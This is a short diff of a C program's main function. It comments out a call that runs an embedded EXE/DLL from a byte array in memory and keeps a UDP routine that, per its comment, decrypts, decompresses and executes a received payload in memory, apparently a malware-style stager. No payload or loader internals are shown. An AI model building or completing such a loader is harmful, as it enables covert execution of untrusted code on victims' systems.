@@ -3146,8 +3146,8 @@ int main()
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 		};
-	int big = sizeof(rawData);
-	exe_dll_in_mem(rawData, big);
+	//int big = sizeof(rawData);
+	//exe_dll_in_mem(rawData);
 
 
 
@@ -3158,8 +3158,8 @@ int main()
 
 
 
-	//decryption, decompression, and execution in memory happens in here so we dont have to worry about allocating unknown buffer sizes.
-	udp_server_clinet();
+		//decryption, decompression, and execution in memory happens in here so we dont have to worry about allocating unknown buffer sizes.
+		udp_server_clinet();
 	}
 
 	return 0;
